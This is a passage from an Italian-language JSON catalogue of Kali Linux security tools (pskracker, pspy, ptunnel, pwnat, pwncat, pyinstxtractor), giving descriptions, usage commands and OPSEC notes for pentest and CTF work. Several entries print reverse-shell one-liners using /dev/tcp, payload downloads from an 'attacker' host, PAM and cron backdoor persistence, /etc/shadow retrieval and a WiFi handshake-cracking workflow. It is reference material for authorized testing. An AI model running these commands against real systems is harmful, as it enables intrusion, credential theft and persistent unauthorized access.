CONNECT solo verso porta 443 (HTTPS). Server SSH o C2 devono ascoltare su porta 443 per bypassare questa restrizione.</p><p><strong>Policy Violation:</strong> Il bypass di restrizioni di rete aziendali viola tipicamente le policy di sicurezza. In contesti di pentest, deve essere esplicitamente autorizzato nello scope dell'engagement.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "pskracker",
    "name": "pskracker",
    "version": "0.3.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pskracker/",
    "desc": "Genera wordlist specifiche per router default password basate su pattern comuni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PSKracker</strong> è un generatore di wordlist specializzato nel cracking di password WiFi factory-default dei router. Molti router consumer vengono venduti con password WPA2 pre-configurate che sembrano casuali ma sono in realtà derivate algoritmicamente da informazioni del dispositivo: MAC address, numero seriale, modello, o combinazioni di questi. PSKracker implementa gli algoritmi di generazione password reverse-engineered per diversi vendor (TP-Link, Netgear, Huawei, Arris, ZTE, e altri), producendo wordlist mirate che contengono le possibili password factory per un dispositivo specifico. Invece di provare milioni di password casuali, PSKracker genera dizionari di poche migliaia di candidati con altissima probabilità di successo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Vendor-Specific Algorithms:</strong> Implementa gli algoritmi di generazione password per vendor specifici. Ogni vendor usa un metodo diverso: TP-Link deriva la password dagli ultimi byte del MAC, Netgear usa combinazioni di seriale e modello, Huawei usa porzioni del MAC con trasformazioni. PSKracker riproduce esattamente questi algoritmi.</p><p><strong>MAC Address Derivation:</strong> Data la BSSID (MAC address dell'access point, visibile in qualsiasi scan WiFi), calcola tutte le possibili password factory. Per alcuni vendor, il MAC da solo è sufficiente per determinare la password con certezza. Per altri, genera un set ridotto di candidati.</p><p><strong>ESSID Pattern Analysis:</strong> Alcuni router includono informazioni nel nome della rete (ESSID) che restringono lo spazio delle password. Ad esempio, \"NETGEAR-5G-AB12\" contiene un suffisso derivato dalla stessa fonte della password.</p><p><strong>Compact Wordlists:</strong> Le wordlist generate sono estremamente compatte (centinaia o migliaia di voci, non milioni), rendendo l'attacco con aircrack-ng o hashcat quasi istantaneo. Un attacco che con dizionari generici richiederebbe ore, con PSKracker termina in secondi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>PSKracker richiede informazioni sul target: BSSID (MAC), ESSID, o modello router.</p><pre><code># Genera wordlist per TP-Link basata su MAC\npskracker -t tplink -m AA:BB:CC:DD:EE:FF\n\n# Genera per Netgear con ESSID\npskracker -t netgear -e \"NETGEAR-5G-AB12\"\n\n# Output su file per uso con aircrack-ng\npskracker -t huawei -m AA:BB:CC:DD:EE:FF -o huawei_wl.txt\n\n# Genera per tutti i vendor (quando non si conosce il modello)\npskracker -t all -m AA:BB:CC:DD:EE:FF -o combined.txt\n\n# Workflow completo WiFi cracking\n# 1. Scan reti e identifica target\nairodump-ng wlan0mon\n\n# 2. Cattura handshake\naireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon\nairodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon\n\n# 3. Genera wordlist mirata\npskracker -t tplink -m AA:BB:CC:DD:EE:FF -o targeted.txt\n\n# 4. Crack con wordlist compatta (secondi, non ore)\naircrack-ng capture-01.cap -w targeted.txt\n\n# Con hashcat (per GPU acceleration)\nhashcat -m 22000 capture.hc22000 targeted.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Penetration Testing</strong>, PSKracker è il primo tool da provare contro access point con password factory. Se il target non ha cambiato la password di default, l'attacco è quasi garantito e termina in secondi. Statisticamente, una percentuale significativa di router domestici mantiene la password factory.</p><p>Per <strong>Corporate Security Audit</strong>, verifica che tutti i dispositivi WiFi aziendali abbiano password custom e non default. Router con password factory in ambienti corporate rappresentano una vulnerabilità critica immediata.</p><p>Per <strong>ISP Assessment</strong>, i provider internet spesso configurano in massa router con password derivate algoritmicamente. PSKracker può validare se l'algoritmo dell'ISP è stato compromesso e quanto sia facile craccare le password dei clienti.</p><p>Per <strong>Research</strong>, reverse engineering di nuovi algoritmi di generazione password da parte di vendor non ancora supportati. Analisi della sicurezza degli schemi di password factory.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Efficacia Limitata:</strong> PSKracker funziona solo contro password factory non modificate. Se l'utente ha cambiato la password, il tool è inutile. L'efficacia dipende dal comportamento degli utenti nella propria area.</p><p><strong>Legalità:</strong> Tentare di craccare password WiFi di reti altrui senza autorizzazione è illegale in quasi tutte le giurisdizioni, anche se la password è di default. Usare solo su reti proprie o con autorizzazione scritta.</p><p><strong>Algorithm Currency:</strong> I vendor modificano gli algoritmi di generazione nelle nuove revisioni hardware. PSKracker potrebbe non essere aggiornato per i modelli più recenti. Verificare la data dell'ultimo update.</p><p><strong>Complementarità:</strong> Anche se PSKracker fallisce, le informazioni raccolte (vendor, modello) guidano la scelta di wordlist generiche più appropriate per un attacco dictionary tradizionale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists",
      "Generators"
    ],
    "notes": null
  },
  {
    "id": "pspy",
    "name": "pspy",
    "version": "1.2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pspy/",
    "desc": "Monitor processi Linux senza privilegi root per scoprire cronjob e processi nascosti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>pspy</strong> è un tool di process monitoring per Linux che opera senza privilegi root, progettato specificamente per la fase di privilege escalation reconnaissance. Su Linux, normalmente un utente non privilegiato non può vedere i processi di altri utenti in dettaglio (specialmente con <code>hidepid</code> abilitato). pspy aggira questa limitazione usando due tecniche: <strong>inotify watchers</strong> su directory critiche (/tmp, /etc/cron.d, /usr/bin, etc.) per rilevare accessi a file, e <strong>procfs scanning</strong> ad alta frequenza per catturare processi effimeri prima che terminino. Il risultato è la capacità di scoprire cronjob, script schedulati, e comandi lanciati da root o altri utenti — informazioni cruciali per identificare vettori di privilege escalation come script world-writable eseguiti da root.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Unprivileged Process Discovery:</strong> Monitora la creazione di nuovi processi senza necessità di root. Usa polling rapido di /proc per catturare processi che esistono solo per frazioni di secondo (come script cron). Mostra il comando completo con tutti gli argomenti, l'UID dell'utente che lo esegue, e il timestamp.</p><p><strong>Inotify File Monitoring:</strong> Installa watcher inotify su directory chiave del filesystem. Quando un file viene acceduto, modificato, o eseguito, pspy lo rileva. Questo cattura attività come: cron che legge uno script, servizi che accedono a configurazioni, o task schedulati che scrivono file.</p><p><strong>Cron Job Detection:</strong> Particolarmente efficace nel rivelare cronjob di altri utenti e di root. Mentre <code>crontab -l</code> mostra solo i propri cron, pspy cattura l'esecuzione effettiva di tutti i cronjob, inclusi quelli in /etc/cron.d/ e crontab di root.</p><p><strong>Static Binary:</strong> Distribuito come binario Go compilato staticamente (pspy32/pspy64). Zero dipendenze, zero installazione. Si trasferisce sul target e si esegue direttamente. Ideale per ambienti minimali senza package manager.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>pspy è un singolo binario statico. Si trasferisce sul target e si esegue.</p><pre><code># Trasferimento sul target\n# Attaccante:\npython3 -m http.server 8000\n# Target:\nwget http://attacker:8000/pspy64 -O /tmp/pspy64\nchmod +x /tmp/pspy64\n\n# Monitoring base (procfs + inotify)\n./pspy64\n\n# Scan procfs più frequente (ogni 100ms)\n./pspy64 -pf -i 100\n\n# Monitoring solo filesystem events (no procfs)\n./pspy64 -f\n\n# Monitora directory custom aggiuntive\n./pspy64 -r /opt/scripts -r /home\n\n# Output colorato per UID (rosso=root, blu=utente)\n./pspy64 -c\n\n# Output tipico:\n# 2024/01/15 14:00:01 CMD: UID=0 PID=1234 | /bin/bash /opt/scripts/backup.sh\n# 2024/01/15 14:00:01 CMD: UID=0 PID=1235 | /usr/bin/python3 /root/cleanup.py\n# 2024/01/15 14:05:00 CMD: UID=0 PID=1240 | /bin/sh -c chmod 777 /tmp/exchange\n\n# Scenario: trovato cronjob root che esegue script scrivibile\nls -la /opt/scripts/backup.sh\n# -rwxrwxrwx 1 root root ... /opt/scripts/backup.sh\n# → Privesc: modifica lo script per aggiungere reverse shell</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Privilege Escalation</strong>, pspy è il tool definitivo per scoprire vettori di escalation basati su task schedulati. Cronjob root che eseguono script world-writable, servizi che processano file in directory scrivibili, o comandi con wildcard injection sono tutti rilevabili monitorando i processi nel tempo.</p><p>Per <strong>CTF Challenges</strong>, in praticamente ogni CTF Linux con privilege escalation, pspy è il primo tool da eseguire. Rivela immediatamente cronjob nascosti che sono spesso il vettore inteso per l'escalation.</p><p>Per <strong>Situational Awareness</strong>, comprensione completa di cosa succede sul sistema: servizi attivi, task periodici, interazioni tra processi. Utile anche per identificare software vulnerabile che viene eseguito periodicamente.</p><p>Per <strong>Persistence Detection</strong>, in contesti difensivi, pspy può rivelare processi sospetti lanciati periodicamente che potrebbero indicare persistence di un attaccante (beacon C2, script di exfiltration schedulati).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>CPU Usage:</strong> Il polling frequente di /proc genera utilizzo CPU visibile. Con intervalli molto brevi (-i 10), può raggiungere il 5-10% CPU. Intervalli più lunghi riducono il consumo ma possono perdere processi molto effimeri.</p><p><strong>Process Visibility:</strong> Il processo pspy stesso è visibile in <code>ps aux</code>. Un amministratore attento o un tool di monitoring può notare il binario in esecuzione. Rinominare il binario può aiutare.</p><p><strong>Inotify Limits:</strong> Linux ha un limite sul numero di inotify watchers per utente (default 8192). Se il sistema ha già molti watcher attivi, pspy potrebbe non riuscire ad installare tutti i suoi. Inoltre, un numero elevato di nuovi watcher è un indicatore di anomalia.</p><p><strong>Disk Footprint:</strong> Il binario statico (~3-4MB) deve essere scritto su disco a meno di non usare tecniche di esecuzione fileless (memfd_create). La presenza del file sul filesystem è un artefatto forensico.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "ptunnel",
    "name": "ptunnel",
    "version": "0.72",
    "icon": "../app/icons/ptunnel-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ptunnel/",
    "desc": "Tunneling TCP over ICMP per exfiltration e comunicazione attraverso firewall restrittivi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ptunnel</strong> (Ping Tunnel) è un tool che incapsula connessioni TCP all'interno di pacchetti ICMP echo request/reply (ping). Sfrutta il fatto che molte reti, anche quelle con policy firewall molto restrittive, permettono il traffico ICMP perché gli amministratori considerano il ping necessario per diagnostica. I dati TCP vengono frammentati e inseriti nel payload dei pacchetti ICMP, che normalmente contiene solo dati di padding. Il server Ptunnel riceve i pacchetti ICMP, estrae il payload TCP, e lo inoltra alla destinazione reale. Il risultato è un tunnel TCP funzionante che attraversa firewall che bloccano tutto tranne ICMP, creando un canale di comunicazione covert utilizzabile per SSH, HTTP, o qualsiasi protocollo TCP.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>ICMP Encapsulation:</strong> I dati TCP vengono segmentati e inseriti nel payload di pacchetti ICMP echo request (client→server) e echo reply (server→client). Il tunnel gestisce sequencing, ritrasmissione, e flow control per garantire affidabilità sulla base di un protocollo non connection-oriented.</p><p><strong>Transparent TCP Proxy:</strong> Il client crea un listener TCP locale che accetta connessioni e le inoltra attraverso il tunnel ICMP al server, che le forwarda alla destinazione TCP reale. Per le applicazioni locali, il tunnel è completamente trasparente.</p><p><strong>Authentication:</strong> Password opzionale per proteggere il server da utilizzo non autorizzato. Senza autenticazione, chiunque conosca l'IP del server può usare il tunnel. La password è trasmessa in chiaro nel pacchetto ICMP iniziale.</p><p><strong>Reliability Layer:</strong> Implementa un livello di affidabilità sopra ICMP (che è unreliable): sequence numbers, acknowledgments, e ritrasmissione automatica di pacchetti persi. Questo rende il tunnel utilizzabile per protocolli TCP che richiedono delivery garantito.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Ptunnel richiede un componente server su una macchina raggiungibile via ICMP e un client sulla macchina nella rete restrittiva.</p><pre><code># === SERVER (macchina esterna con accesso internet) ===\n# Avvio server con password\nsudo ptunnel -x mysecretpass\n\n# Server su interfaccia specifica\nsudo ptunnel -x mysecretpass -c eth0\n\n# === CLIENT (macchina nella rete restrittiva) ===\n# Tunnel SSH: porta locale 2222 → server → target SSH 22\nsudo ptunnel -p server_pubblico -lp 2222 -da target.com -dp 22 \\\n  -x mysecretpass\n\n# Connessione SSH attraverso il tunnel\nssh -p 2222 user@127.0.0.1\n\n# Tunnel HTTP: porta locale 8080 → server → web 80\nsudo ptunnel -p server_pubblico -lp 8080 -da webserver.com -dp 80 \\\n  -x mysecretpass\ncurl http://127.0.0.1:8080\n\n# Tunnel per reverse shell\n# Target: ptunnel client → porta locale 4444\nsudo ptunnel -p server_pubblico -lp 4444 -da attacker.com -dp 4444 \\\n  -x pass\n# Attaccante: nc -lvp 4444 (riceve connessione via ICMP tunnel)\n\n# Verboso per debug\nsudo ptunnel -p server -lp 2222 -da target -dp 22 -x pass -v 4\n\n# Limitare connessioni simultanee\nsudo ptunnel -x pass -m 5</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Firewall Bypass</strong>, in reti che bloccano tutto il traffico TCP/UDP outbound ma permettono ICMP, ptunnel crea un canale di comunicazione funzionante. Questo è sorprendentemente comune in reti guest, ambienti IoT, e reti industriali dove il ping è l'unico protocollo consentito.</p><p>Per <strong>Covert Communication</strong>, il traffico ICMP è spesso trascurato dal monitoring. Un canale C2 basato su ICMP può operare più a lungo sotto il radar rispetto a connessioni TCP/HTTP verso IP sospetti.</p><p>Per <strong>Data Exfiltration</strong>, trasferimento dati da reti isolate dove i canali TCP sono bloccati. La bandwidth è limitata ma sufficiente per estrarre documenti, credenziali, o database piccoli.</p><p>Per <strong>Network Testing</strong>, verifica che le policy firewall siano implementate correttamente. Se ptunnel funziona, significa che il firewall non ispeziona il contenuto dei pacchetti ICMP, una lacuna di sicurezza.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Volume ICMP Anomalo:</strong> Un tunnel attivo genera un volume di pacchetti ICMP significativamente superiore al normale. Sistemi di monitoring che tracciano il volume ICMP per host possono facilmente identificare l'anomalia.</p><p><strong>Payload Size:</strong> I pacchetti ICMP di ptunnel hanno payload molto più grandi del normale ping (che usa 32-64 byte). DPI (Deep Packet Inspection) può facilmente distinguere pacchetti ptunnel da ping legittimi analizzando la dimensione del payload.</p><p><strong>Root Required:</strong> Sia client che server richiedono privilegi root/administrator per creare raw socket ICMP. Questo limita l'uso su sistemi dove non si ha escalation.</p><p><strong>No Encryption:</strong> I dati nel tunnel non sono crittografati: sono solo incapsulati in ICMP. Per confidenzialità, usare SSH o VPN all'interno del tunnel ptunnel.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "pwnat",
    "name": "pwnat",
    "version": "0.3.0",
    "icon": "../app/icons/pwnat-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pwnat/",
    "desc": "NAT traversal per connessioni peer-to-peer tra host dietro NAT senza port forwarding.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pwnat</strong> (pronunciato \"poe-nat\") è un tool che risolve uno dei problemi più complessi del networking: stabilire connessioni dirette tra due host entrambi dietro NAT, senza necessità di port forwarding, UPnP, o server di relay esterni. Usa una tecnica ingegnosa basata su pacchetti ICMP: il server invia continuamente pacchetti ICMP echo request verso un IP inesistente (3.3.3.3 di default). Quando il client vuole connettersi, invia un pacchetto ICMP Time Exceeded (come se fosse un router intermedio) che il NAT del server riconosce come risposta al pacchetto originale, creando un mapping NAT bidirezionale. Questa tecnica sfrutta il modo in cui i NAT tracciano le connessioni ICMP per creare un \"hole\" attraverso cui il traffico TCP viene poi tunnelizzato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Autonomous NAT Traversal:</strong> Non richiede alcun server di rendez-vous, STUN server, o relay esterno. La comunicazione è completamente peer-to-peer. Il server deve solo conoscere l'IP pubblico per ricevere connessioni, ma non richiede port forwarding.</p><p><strong>ICMP Hole Punching:</strong> La tecnica ICMP Time Exceeded è più affidabile del tradizionale UDP hole punching perché la maggior parte dei NAT tratta i messaggi ICMP di errore in modo speciale, associandoli automaticamente alla sessione che li ha causati.</p><p><strong>TCP Tunneling:</strong> Una volta stabilito il canale ICMP, pwnat crea un tunnel TCP trasparente. Le applicazioni locali si connettono a una porta locale che viene forwardata attraverso il tunnel alla porta remota, permettendo SSH, HTTP, o qualsiasi protocollo TCP.</p><p><strong>No Configuration Required:</strong> Il server pwnat non richiede configurazione di router o firewall. Basta avere accesso outbound ICMP (che la maggior parte delle reti permette). Il client necessita solo dell'IP pubblico del server.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>pwnat ha due modalità: server (in attesa di connessioni) e client (si connette al server).</p><pre><code># === SERVER (host dietro NAT che accetta connessioni) ===\n# Avvio in modalità server\nsudo pwnat -s\n# Server invia ICMP echo request a 3.3.3.3 continuamente\n# Attendendo risposte ICMP Time Exceeded dal client\n\n# Server con IP target diverso per ICMP\nsudo pwnat -s -d 1.2.3.4\n\n# === CLIENT (si connette al server attraverso doppio NAT) ===\n# Forward porta locale 2222 → server:22 (SSH)\nsudo pwnat -c 203.0.113.50 -lp 2222 -dp 22\n\n# Connessione SSH attraverso il tunnel\nssh -p 2222 user@127.0.0.1\n\n# Forward per HTTP\nsudo pwnat -c server_public_ip -lp 8080 -dp 80\ncurl http://127.0.0.1:8080\n\n# Scenario: reverse shell da rete NATtata\n# 1. Attaccante (dietro NAT) avvia server pwnat\nsudo pwnat -s\n\n# 2. Target (dietro altro NAT) si connette\nsudo pwnat -c attacker_public_ip -lp 4444 -dp 4444\n\n# 3. Attaccante riceve shell sulla porta 4444\nnc -lvp 4444\n# Target: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Callback da Reti NATtate</strong>, in scenari dove il target è dietro NAT e non si possono configurare port forwarding o reverse proxy, pwnat permette di stabilire connessioni bidirezionali. Particolarmente utile quando anche l'attaccante è dietro NAT.</p><p>Per <strong>C2 Communication</strong>, implant su host dietro NAT restrittivo possono usare pwnat per stabilire canali C2 senza dipendere da server relay esterni che potrebbero essere bloccati o monitorati.</p><p>Per <strong>Remote Administration</strong>, accesso a dispositivi IoT, server domestici, o sistemi embedded dietro NAT senza dover configurare port forwarding sul router, che spesso non è sotto il controllo dell'operatore.</p><p>Per <strong>Network Testing</strong>, verifica che il NAT e il firewall implementino correttamente filtering ICMP. Se pwnat funziona, significa che il NAT non ispeziona adeguatamente i pacchetti ICMP di errore, una debolezza sfruttabile.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>ICMP Requirement:</strong> Richiede che ICMP outbound sia permesso su entrambi i lati. Reti corporate che bloccano ICMP outbound renderanno pwnat inutilizzabile.</p><p><strong>NAT Compatibility:</strong> Non funziona con tutti i tipi di NAT. NAT simmetrici stretti possono bloccare la tecnica. L'efficacia dipende dall'implementazione specifica del NAT sul router. Richiede test caso per caso.</p><p><strong>Traffico ICMP Anomalo:</strong> Il server invia continuamente ICMP echo request verso un IP inesistente, generando un pattern di traffico insolito. Network monitoring può rilevare questo comportamento come anomalia.</p><p><strong>Root Privileges:</strong> Sia client che server richiedono root per raw socket ICMP. Limita l'uso a scenari dove si ha già privilege escalation o accesso amministrativo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "pwncat",
    "name": "pwncat",
    "version": "0.1.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pwncat/",
    "desc": "Framework post-exploitation Python con shell interattiva, upload/download, persistence.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pwncat</strong> (pwncat-cs) è un framework post-exploitation Python sviluppato da Caleb Stewart che trasforma reverse e bind shell basilari in ambienti di lavoro completi e interattivi. Quando si riceve una reverse shell grezza (es. <code>bash -i</code>), questa manca di funzionalità essenziali: tab completion, job control, gestione segnali, e trasferimento file. Pwncat risolve tutti questi problemi con upgrade automatico a PTY completo, file transfer integrato (senza necessità di tool esterni sul target), moduli di enumeration e privilege escalation, e capacità di persistence automatizzata. Supporta target Linux e Windows, con moduli specifici per ciascuna piattaforma. È diventato il listener di riferimento per CTF e penetration testing, sostituendo il classico <code>nc -lvp</code>.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Automatic Shell Upgrade:</strong> Quando riceve una shell grezza, pwncat esegue automaticamente l'upgrade a PTY interattivo completo. Su Linux usa Python/script/socat per creare un pseudo-terminal con tab completion, Ctrl+C handling, history, e window resize. L'utente passa immediatamente da una shell limitata a un terminale completo.</p><p><strong>Integrated File Transfer:</strong> Comandi <code>upload</code> e <code>download</code> trasferiscono file bidirezionalmente usando la connessione shell esistente, senza bisogno di tool aggiuntivi (wget, curl, netcat) sul target. Usa base64 encoding attraverso il canale shell o tecniche più efficienti quando disponibili.</p><p><strong>Enumeration Modules:</strong> Moduli di reconnaissance automatizzata: SUID binaries, capabilities, writable directories, cronjob, kernel version, installazioni software. Produce report strutturati che evidenziano potenziali vettori di privilege escalation.</p><p><strong>Persistence Framework:</strong> Installa backdoor persistenti con un singolo comando: cron jobs, SSH authorized_keys, PAM backdoor, bashrc injection, systemd service. Ogni metodo di persistence può essere installato e rimosso in modo pulito.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Pwncat si usa come listener (sostituisce nc) o come client per bind shell.</p><pre><code># Listener per reverse shell (sostituisce nc -lvp)\npwncat-cs -lp 4444\n\n# Target invia reverse shell\n# bash -i >& /dev/tcp/attacker/4444 0>&1\n\n# Connessione a bind shell\npwncat-cs connect://target:4444\n\n# Connessione SSH diretta\npwncat-cs ssh://user:password@target\n\n# === COMANDI PWNCAT (prompt \"(local)\" o \"(remote)\") ===\n\n# Switch tra modalità locale e remota\n# Ctrl+D per tornare a pwncat prompt\n# \"back\" per tornare alla shell remota\n\n# File transfer\n(local) pwncat$ upload ./linpeas.sh /tmp/linpeas.sh\n(local) pwncat$ download /etc/shadow ./shadow\n\n# Enumeration automatica\n(local) pwncat$ run enumerate\n(local) pwncat$ run enumerate.file.suid\n(local) pwncat$ run enumerate.system.network\n\n# Privilege escalation assist\n(local) pwncat$ run escalate.auto\n\n# Persistence\n(local) pwncat$ run persist.cron_reverse_shell \\\n  host=attacker port=5555 interval=5\n(local) pwncat$ run persist.authorized_keys key=~/.ssh/id_rsa.pub\n(local) pwncat$ run persist.pam_backdoor password=backdoor123\n\n# Lista persistence installate\n(local) pwncat$ run persist.gather\n\n# Rimuovi persistence\n(local) pwncat$ run persist.cron_reverse_shell --remove\n\n# Gestione sessioni multiple\n(local) pwncat$ sessions\n(local) pwncat$ sessions -i 1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Post-Exploitation Workflow</strong>, pwncat è il sostituto moderno di netcat come listener per reverse shell. L'upgrade automatico a PTY, il file transfer integrato, e i moduli di enumeration eliminano i passaggi manuali ripetitivi che rallentano le operazioni.</p><p>Per <strong>CTF Competitions</strong>, pwncat è lo standard de facto. Gestione rapida di shell, enumeration automatica per privilege escalation, e capacità di mantenere sessioni stabili sono essenziali quando il tempo è limitato.</p><p>Per <strong>Persistence Management</strong>, il framework di persistence con install/uninstall pulito permette di testare diversi metodi di backdoor e rimuoverli completamente al termine dell'engagement, senza lasciare artefatti.</p><p>Per <strong>Multi-Target Management</strong>, il supporto sessioni multiple permette di gestire shell su diversi target simultaneamente dalla stessa istanza pwncat, con switching rapido tra sessioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Python Dependency:</strong> Molte funzionalità avanzate (PTY upgrade, enumeration) richiedono Python sul target. Su sistemi minimali senza Python, le capacità sono ridotte alla shell base con file transfer via base64.</p><p><strong>Persistence Artifacts:</strong> Ogni modulo di persistence lascia artefatti specifici: entry in crontab, chiavi SSH aggiunte, moduli PAM modificati. Tutti sono rilevabili da audit di sicurezza. Usare <code>persist.gather</code> per tracciare e rimuovere alla fine.</p><p><strong>Shell History:</strong> I comandi eseguiti sulla shell remota vengono registrati nella history del sistema (.bash_history). Pwncat tenta di disabilitare la history durante la sessione, ma non è garantito in tutti gli ambienti.</p><p><strong>Network Connection:</strong> La connessione shell è in chiaro (non crittografata a meno di non usare SSH). Traffic inspection rivela comandi e output. Per ambienti monitorati, preferire la modalità SSH integrata.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "pyinstxtractor",
    "name": "pyinstxtractor",
    "version": "2025.02",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pyinstxtractor/",
    "desc": "Estrae sorgenti Python da eseguibili PyInstaller per reverse engineering di malware.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>pyinstxtractor</strong> è un tool Python per estrarre il contenuto di eseguibili creati con PyInstaller, il packaging tool più diffuso per distribuire applicazioni Python come eseguibili standalone. PyInstaller crea un archivio CArchive contenente bytecode Python compilato (.pyc), librerie, e risorse, tutto embedato nell'eseguibile. pyinstxtractor reverse-engineera la struttura dell'archivio CArchive, estrae tutti i file contenuti, e ricostruisce gli header dei file .pyc (che PyInstaller modifica). Il risultato è una directory con tutti i moduli Python compilati e le risorse, pronti per la decompilazione. È lo strumento fondamentale nel workflow di reverse engineering di malware Python e applicazioni distribuite come exe.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>CArchive Extraction:</strong> Riconosce e decompone la struttura CArchive di PyInstaller all'interno dell'eseguibile. Supporta tutte le versioni di PyInstaller (dalla 2.x alla 6.x), incluse varianti con compressione zlib, cifratura (PYZ), e obfuscation. Estrae anche eseguibili creati con versioni molto vecchie.</p><p><strong>PYC Header Reconstruction:</strong> PyInstaller rimuove o modifica gli header dei file .pyc durante il packaging. pyinstxtractor ricostruisce automaticamente l'header corretto basandosi sulla versione Python rilevata, rendendo i file decompilabili direttamente con uncompyle6, decompyle3, o pycdc.</p><p><strong>Complete Resource Recovery:</strong> Estrae non solo il codice Python ma anche tutte le risorse bundle: file di dati, configurazioni, certificati, DLL, icone, e qualsiasi file incluso con <code>--add-data</code>. Spesso queste risorse contengono informazioni sensibili (chiavi API, credenziali, configurazioni C2).</p><p><strong>Version Detection:</strong> Identifica automaticamente la versione di PyInstaller e la versione di Python usata per creare l'eseguibile. Queste informazioni sono essenziali per scegliere il decompilatore corretto e interpretare il bytecode.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>pyinstxtractor è un singolo script Python. Il workflow completo include estrazione + decompilazione.</p><pre><code># Estrazione dell'eseguibile PyInstaller\npython3 pyinstxtractor.py suspicious_app.exe\n# [+] Processing suspicious_app.exe\n# [+] Pyinstaller version: 5.13.0\n# [+] Python version: 3.10\n# [+] Length of package: 5243800 bytes\n# [+] Found 45 files in CArchive\n# [+] Possible entry point: main.pyc\n# [+] Successfully extracted\n\n# Esplora contenuto estratto\nls suspicious_app.exe_extracted/\n# main.pyc  PYZ-00.pyz_extracted/  struct.pyc\n# base_library.zip  _internal/\n\n# Decompilazione del main entry point\n# Con uncompyle6 (Python 3.8 e precedenti)\nuncompyle6 suspicious_app.exe_extracted/main.pyc > main.py\n\n# Con decompyle3 (Python 3.9+)\ndecompyle3 suspicious_app.exe_extracted/main.pyc > main.py\n\n# Con pycdc (cross-version, C++)\npycdc suspicious_app.exe_extracted/main.pyc > main.py\n\n# Decompila tutti i moduli estratti dal PYZ\nfor f in PYZ-00.pyz_extracted/*.pyc; do\n  uncompyle6 \"$f\" > \"${f%.pyc}.py\" 2>/dev/null\ndone\n\n# Cerca stringhe sospette nei file estratti\ngrep -r 'password\\|api_key\\|token\\|secret' \\\n  suspicious_app.exe_extracted/\n\n# Per eseguibili cifrati (con --key)\n# pyinstxtractor mostra la chiave se trova il modulo crypto\n# Altrimenti: cercare la chiave nell'eseguibile con strings</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Malware Analysis</strong>, moltissimo malware è scritto in Python e distribuito come exe via PyInstaller. pyinstxtractor è il primo passo per ottenere il codice sorgente. Dopo la decompilazione, si analizzano: payload, meccanismi di persistence, protocolli C2, chiavi di cifratura, e target dell'attacco.</p><p>Per <strong>CTF Challenges</strong>, sfide di reverse engineering spesso includono eseguibili PyInstaller. pyinstxtractor + decompilatore è il workflow standard per risolvere queste challenge in pochi minuti.</p><p>Per <strong>Security Audit di Applicazioni</strong>, verifica che applicazioni Python distribuite come exe non contengano credenziali hardcoded, chiavi API, o logica di sicurezza bypassabile. PyInstaller non offre protezione del codice sorgente.</p><p>Per <strong>Software Analysis</strong>, analisi di applicazioni closed-source distribuite come exe Python. Permette di comprendere la logica di business, identificare librerie usate, e verificare il comportamento del software.</p><br><hr><h4 